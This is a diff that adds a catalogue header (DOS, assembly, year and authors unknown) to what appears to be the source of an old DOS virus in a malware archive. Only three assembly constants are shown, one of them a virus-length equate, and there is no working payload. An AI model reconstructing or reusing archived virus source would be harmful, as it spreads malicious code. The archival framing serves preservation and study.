@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 dta						equ			offset last_byte+10
 virlen				equ			(offset last_byte - offset start)
 strlen				equ			(offset endstr - offset startstr)
